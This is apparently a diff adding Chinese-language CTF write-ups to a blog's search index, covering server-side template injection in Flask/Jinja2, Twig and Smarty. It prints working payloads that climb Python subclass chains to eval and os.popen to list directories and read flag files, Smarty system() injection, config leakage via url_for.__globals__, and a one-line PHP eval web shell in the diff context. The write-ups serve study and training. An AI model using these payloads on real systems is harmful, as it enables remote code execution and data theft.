@@ -649,4 +649,103 @@ fputs(fopen('shell.php','w'),'<?php @eval($_POST['df']); ?><p>‘);</p>
 <p>使用phar:&#x2F;&#x2F;.&#x2F;upload&#x2F;文件名</p>
 ]]></content>
   </entry>
+  <entry>
+    <title>ssti学习</title>
+    <url>/2022/12/06/hong/</url>
+    <content><![CDATA[<p>1.模板引擎</p>
+<p>是为了使 <strong>用户界面</strong>和 业务数据（内容）分离而产生的，它可以生成特定格式的文档，<strong>利用模板引擎来生成前端的HTML代码，模板引擎会提供一套生成HTML代码的程序，之后只需获取用户的数据，放入渲染函数，该数据便会嵌入生成好的HTML页面中</strong>，然后反馈给浏览器，呈现在用户面前</p>
+<p>我们需要构造业务数据插入模板文件来进行指令</p>
+<p>2.实例</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">var template = &#x27;&lt;p&gt;Hello,my name is &lt;%name%&gt;.I am &lt;%age%&gt; years old.&lt;/p&gt;&#x27;;</span><br><span class="line">    用于过滤出以&lt;%开头，%&gt;结尾，并且中间不包含%或&gt;的匹配项</span><br><span class="line">    其目的在于过滤出template中的 &lt;%name%&gt; 和 &lt;%age%&gt;</span><br><span class="line">var regex = /&lt;%([^%]+)?%&gt;/g;</span><br><span class="line">当正则表达式设置 `g` 标志位时，可以多次执行 `exec` 方法来查找同一个字符串中的成功匹配</span><br><span class="line">// 数据</span><br><span class="line">var data =</span><br><span class="line">&#123;</span><br><span class="line">name:&#x27;Deutsh&#x27;,413@</span><br><span class="line">    age:22</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">// 模板引擎</span><br><span class="line">var TemplateEngine = function (template,data)</span><br><span class="line">&#123;</span><br><span class="line">    // exec使用全局正则表达式意味着在循环中使用，因为它仍然会检索所有匹配的子表达式</span><br><span class="line">    // /regex/.exec()仅返回找到的第一个匹配项</span><br><span class="line">    while (match = regex.exec(template))</span><br><span class="line">    &#123;</span><br><span class="line">        template = template.replace(match[0],data[match[1]])</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    return template;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">// 最终的执行在此处</span><br><span class="line"></span><br><span class="line">var string = TemplateEngine(template,data)</span><br><span class="line">console.log(string)</span><br></pre></td></tr></table></figure>
+
+<p>因为当正则表达式设置 g 标志位时，可以多次执行exec方法来查找同一个字符串中的成功匹配</p>
+<h2 id="测试是否存在ssti"><a href="#测试是否存在ssti" class="headerlink" title="测试是否存在ssti"></a>测试是否存在ssti</h2><p>就是更改请求参数使之承载含有模板引擎语法的 Payload，通过页面渲染返回的内容检测承载的 Payload 是否解析，有解析则可以判定含有 Payload 对应模板引擎注入</p>
+<p>Twig实例</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">　　<span class="keyword">require_once</span> <span class="title function_ invoke__">dirname</span>(<span class="keyword">__FILE__</span>).<span class="string">&#x27;\twig\lib\Twig\Autoloader.php&#x27;</span>;</span><br><span class="line">　　<span class="title class_">Twig_Autoloader</span>::<span class="title function_ invoke__">register</span>(<span class="literal">true</span>);</span><br><span class="line">　　<span class="variable">$twig</span> = <span class="keyword">new</span> <span class="title class_">Twig_Environment</span>(<span class="keyword">new</span> <span class="title class_">Twig_Loader_String</span>());</span><br><span class="line">　　<span class="variable">$output</span> = <span class="variable">$twig</span>-&gt;<span class="title function_ invoke__">render</span>(<span class="string">&quot;Hello &#123;&#123;name&#125;&#125;&quot;</span>, <span class="keyword">array</span>(<span class="string">&quot;name&quot;</span> =&gt; <span class="variable">$_GET</span>[<span class="string">&quot;name&quot;</span>]));</span><br><span class="line">　　<span class="keyword">echo</span> <span class="variable">$output</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>若就如我们最开始的例子所说，<strong>若模板引擎渲染的内容受我们控制了</strong>，就不一定了</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$output</span>=<span class="variable">$twig</span>-&gt;<span class="title function_ invoke__">render</span>(<span class="string">&quot;Hello <span class="subst">&#123;$_GET[&#x27;name&#x27;]&#125;</span>&quot;</span>);</span><br></pre></td></tr></table></figure>
+
+<p>对于Twig模板的变量</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;&#123;%s&#125;&#125;</span><br></pre></td></tr></table></figure>
+
+<p>除了传递变量外，还可以执行表达式，最简单的表达式就是<code>&#123;&#123;2*2&#125;&#125;</code>，这也是辨认是否存在ssti最基本的指纹，若我们输入4，HTML页面返回其其结果4，就说明该表达式被解析，存在ssti</p>
+<p><em>python中的魔术方法</em></p>
+<ul>
+<li><code>__dict__</code>：保存类实例或对象实例的属性变量键值对字典</li>
+<li><code>__class__</code>：返回调用的参数类型</li>
+<li><code>__mro__</code>：返回一个包含对象所继承的基类元组，方法在解析时按照元组的顺序解析。 <strong>寻找基类</strong></li>
+<li><code>__bases__</code>：返回类型列表 <strong>寻找基类</strong></li>
+<li><code>__subclasses__</code>：返回object的子类</li>
+<li><code>__init__</code>：类的初始化方法</li>
+<li><code>__globals__</code>：函数会以字典类型返回当前位置的全部全局变量 与<code>func_globals</code>等价</li>
+</ul>
+]]></content>
+  </entry>
+  <entry>
+    <title>FlaskLight</title>
+    <url>/2022/12/09/fghl/</url>
+    <content><![CDATA[<h1 id="FlaskLight"><a href="#FlaskLight" class="headerlink" title="FlaskLight"></a>FlaskLight</h1><ol>
+<li><p>进入题目可也看到有一个FlaskLight的提示先查看源码发现提示内容：有一个get请求方式的参数search </p>
+</li>
+<li><p>传递参数search并进行模板注入的测试，输入?search&#x3D;40，页面输出表达式的结果，很好可以进行模板注入，回显点在You searched for下面</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">寻找执行命可以借助的类</span><br><span class="line">  获取所有继承自object的类 &#123;&#123;[].__class__.__base__.__subclasses__()&#125;&#125;</span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line">  获取第几位，先估测是第几个，然后根据估测出来的数值尝试得到正确的值  </span><br></pre></td></tr></table></figure></li>
+</ol>
+<p> 经过查询后，可以借助的类&lt;class ‘warnings.catch_warnings’&gt;，没有内置os模块在第59位。</p>
+<p> <img src="/2022/12/09/fghl/fir.jpg" alt="题图"></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">a. 目录读取</span><br><span class="line">&#123;&#123;[].__class__.__base__.__subclasses__()[59].__init__[&#x27;__glo&#x27;+&#x27;bals__&#x27;][&#x27;__builtins__&#x27;][&#x27;eval&#x27;](&quot;__import__(&#x27;os&#x27;).popen(&#x27;ls&#x27;).read()&quot;)&#125;&#125;</span><br><span class="line">b. 读取目录flasklight</span><br><span class="line">&#123;&#123;[].__class__.__base__.__subclasses__()[59].__init__[&#x27;__glo&#x27;+&#x27;bals__&#x27;][&#x27;__builtins__&#x27;][&#x27;eval&#x27;](&quot;__import__(&#x27;os&#x27;).popen(&#x27;ls /flasklight&#x27;).read()&quot;)&#125;&#125;</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2022/12/09/fghl/sec.jpg" alt="题图"></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">c. cat文件 coomme_geeeett_youur_flek 得到flag</span><br><span class="line">    &#123;&#123;[].__class__.__base__.__subclasses__()[59].__init__[&#x27;__glo&#x27;+&#x27;bals__&#x27;][&#x27;__builtins__&#x27;][&#x27;eval&#x27;](&quot;__import__(&#x27;os&#x27;).popen(&#x27;cat /flasklight/coomme_geeeett_youur_flek &#x27;).read()&quot;)&#125;&#125; </span><br></pre></td></tr></table></figure>
+
+<p><img src="/2022/12/09/fghl/3.jpg" alt="题图"></p>
+]]></content>
+  </entry>
+  <entry>
+    <title>The mystery of ip</title>
+    <url>/2022/12/09/zz/</url>
+    <content><![CDATA[<p>s宿舍睡</p>
+<p>hint内提醒我们要在ip入手</p>
+<p>先进行抓包</p>
+<p>看到有X-Forwarded-For，可以看到不管我们输入什么都会回显</p>
+<p><img src="/2022/12/09/zz/kkl.jpg" alt="题图"></p>
+<p>输入{config}看看配置，是smarty</p>
+<p>看看版本{$smarty.version}</p>
+<p><img src="/2022/12/09/zz/2.jpg" alt="题图"></p>
+<p>{if system(“ls”)}{&#x2F;if},这里的flag.php是假的，要查根目录下的<br>{if system(“ls &#x2F;”)}{&#x2F;if}</p>
+<p><img src="/2022/12/09/zz/3.jpg" alt="题图"></p>
+<p>{if system(“cat &#x2F;flag”)}{&#x2F;if}<br>还有一种表达就是直接{system(“ls”)}</p>
+<p><img src="/2022/12/09/zz/4.jpg" alt="题图"></p>
+]]></content>
+  </entry>
+  <entry>
+    <title>NEU</title>
+    <url>/2022/12/16/NEU/</url>
+    <content><![CDATA[]]></content>
+  </entry>
+  <entry>
+    <title>WesternCTF2018 shrine</title>
+    <url>/2022/12/12/kkk/</url>
+    <content><![CDATA[<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">import flask</span><br><span class="line">import os</span><br><span class="line"></span><br><span class="line">app = flask.Flask(__name__)</span><br><span class="line"></span><br><span class="line">app.config[&#x27;FLAG&#x27;] = os.environ.pop(&#x27;FLAG&#x27;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">@app.route(&#x27;/&#x27;)</span><br><span class="line">def index():</span><br><span class="line">    return open(__file__).read()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">@app.route(&#x27;/shrine/&lt;path:shrine&gt;&#x27;)</span><br><span class="line">def shrine(shrine):</span><br><span class="line"></span><br><span class="line">    def safe_jinja(s):</span><br><span class="line">        s = s.replace(&#x27;(&#x27;, &#x27;&#x27;).replace(&#x27;)&#x27;, &#x27;&#x27;)</span><br><span class="line">        blacklist = [&#x27;config&#x27;, &#x27;self&#x27;]</span><br><span class="line">        return &#x27;&#x27;.join([&#x27;&#123;&#123;% set &#123;&#125;=None%&#125;&#125;&#x27;.format(c) for c in blacklist]) + s</span><br><span class="line"></span><br><span class="line">    return flask.render_template_string(safe_jinja(shrine))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">if __name__ == &#x27;__main__&#x27;:</span><br><span class="line">    app.run(debug=True)</span><br></pre></td></tr></table></figure>
+
+<p>观察得到，flag在其中</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">app.config[&#x27;FLAG&#x27;] = os.environ.pop(&#x27;FLAG&#x27;)</span><br></pre></td></tr></table></figure>
+
+<p>测试一下在&#x2F;shrine&#x2F;中运行ssti</p>
+<p><img src="/2022/12/12/kkk/1.jpg" alt="题图"></p>
+<p>有过滤，设了黑名单[‘config’,‘self’]并且过滤了括号</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">def safe_jinja(s):</span><br><span class="line">    s = s.replace(&#x27;(&#x27;, &#x27;&#x27;).replace(&#x27;)&#x27;, &#x27;&#x27;)</span><br><span class="line">    blacklist = [&#x27;config&#x27;, &#x27;self&#x27;]</span><br><span class="line">    return &#x27;&#x27;.join([&#x27;&#123;&#123;% set &#123;&#125;=None%&#125;&#125;&#x27;.format(c) for c in blacklist]) + s</span><br></pre></td></tr></table></figure>
+
+<p>使用两个python自带的函数来进行注入</p>
+<p>url_for</p>
+<p>get_flashed_message()</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/shrine/&#123;&#123;url_for.__globals__&#125;&#125;</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2022/12/12/kkk/3.jpg" alt="题图"></p>
+<p>直接读取config</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/shrine/&#123;&#123;url_for.__globals__[&#x27;current_app&#x27;].config&#125;&#125;</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2022/12/12/kkk/2.jpg" alt="题图"></p>
+]]></content>
+  </entry>
 </search>
